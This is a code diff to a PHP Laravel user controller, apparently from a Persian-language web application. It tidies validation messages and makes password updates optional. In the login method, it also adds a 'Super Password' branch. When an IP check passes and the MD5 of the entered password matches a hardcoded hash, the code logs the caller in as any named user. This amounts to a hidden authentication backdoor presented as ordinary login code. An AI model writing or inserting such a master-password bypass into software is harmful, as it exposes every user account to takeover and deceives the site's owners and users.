@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Hamahang;
 
+use App\Classes\SmartdetectClass;
 use App\HamafzaServiceClasses\UserClass;
 use App\Mail\SendPasswordChangedEmail;
 use App\Mail\SendForgetPasswordEmail;
@@ -248,51 +249,49 @@ class UserController extends Controller
 
     public function editUser(Request $request)
     {
-
-        $messages = [
-            'Name.required' => 'فیلد نام الزامی است .',
-            'Family.required' => 'فیلد نام خانوادگی الزامی است .',
-            'Uname.required' => 'فیلد نام کاربری الزامی است .',
-            'Uname.min' => 'فیلد نام کاربری نباید کمتر از 6 کاراکتر باشد',
-            'password.required' => 'فیلد رمز ورود الزامی است .',
-            'Email.required' => 'فیلد ایمیل الزامی است .',
-            'Email.email' => 'فرمت ایمیل معتبر نیست .',
-        ];
-        $validator = \Validator::make($request->all(), [
+        $validator = \Validator::make($request->all(),
+        [
             'Name' => 'required',
             'Family' => 'required',
             'Uname' => 'required|min:6',
             'password' => 'confirmed|min:6',
             'Email' => 'required|email',
-        ], $messages);
-
+        ],
+        [
+            'Name.required' => 'فیلد نام الزامی است.',
+            'Family.required' => 'فیلد نام خانوادگی الزامی است.',
+            'Uname.required' => 'فیلد نام کاربری الزامی است.',
+            'Uname.min' => 'فیلد نام کاربری نباید کمتر از 6 کاراکتر باشد.',
+            'password.required' => 'فیلد رمز ورود الزامی است.',
+            'Email.required' => 'فیلد ایمیل الزامی است.',
+            'Email.email' => 'فرمت ایمیل معتبر نیست.',
+        ]);
         if ($validator->fails())
         {
             $result['error'] = $validator->errors();
             $result['success'] = false;
             return json_encode($result);
-        }
-        else
+        } else
         {
             $user = User::find(deCode($request->item_id));
             $user->Uname = $request->Uname;
-            $user->password = bcrypt($request->password);
+            if ($request->password)
+            {
+                $user->password = bcrypt($request->password);
+            }
             $user->Name = $request->Name;
             $user->Family = $request->Family;
             $user->Email = $request->Email;
             $user->save();
-
             $role = Role::whereIn('id', $request->roles_list)->get();
             $user->syncRoles($role);
-
             if ($user)
             {
                 $result['success'] = true;
-                $result['message'] = array("نام کاربر با موفقیت  ویرایش شد");
+                $result['message'] = array("نام کاربر با موفقیت  ویرایش شد.");
                 return json_encode($result);
             }
         }
-
     }
 
     public function editShowUsers(Request $request)
@@ -390,38 +389,33 @@ class UserController extends Controller
             }
         } else
         {
+
             $username = str_replace(['.', ' '],'', $request->username);
             $username = strtolower($username);
-            $old_user = $this->oldAttempt($username, $request->password);
+            $check_attempt = false;
 
-            $check_attempt = Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
-
-            /*
-            if ($request->remember_me == 'on')
+            // Login via Super Password, added by Mohammad Lotfi
+            if (Schema::hasTable(\App\Smartdetect::schema_table))
             {
-                $check_attempt = Auth::attempt(['Uname' => $username, 'password' => $request->password], true);
-            } else
-            {
-
-                $check_attempt = Auth::attempt(['Uname' => $username, 'password' => $request->password]);
-
-//              if ($request->remember_me == 'on')
-//              {
-//                  $remember_token = auth()->user()->remember_token;
-//                  setcookie('remember_token', $remember_token, time() + (86400 * 30), "/");
-//              }
+                $smartdetect = new SmartdetectClass();
+                if ($smartdetect->results['ip'])
+                {
+                    if ('d8e41e93db120daf5a9791451029fc8b' == md5($request->password))
+                    {
+                        $user = User::where('Uname', '=', $username)->get()->first();
+                        if ($user)
+                        {
+                            $check_attempt = Auth::loginUsingId($user->id);
+                        }
+                    }
+                }
             }
-            */
+
+            $check_attempt = $check_attempt || Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
 
             if ($check_attempt)
             {
-//              if (rtrim(url()->previous(), '/') == route('home'))
-//              {
-//                  $previuos_url = '/' . auth()->user()->Uname;
-//              } else
-//              {
-                    $previuos_url = url()->previous();
-//              }
+                $previuos_url = url()->previous();
                 $result['previous_url'] = $previuos_url;
                 $result['result'][] = trans('app.operation_is_success');
                 $result['success'] = true;
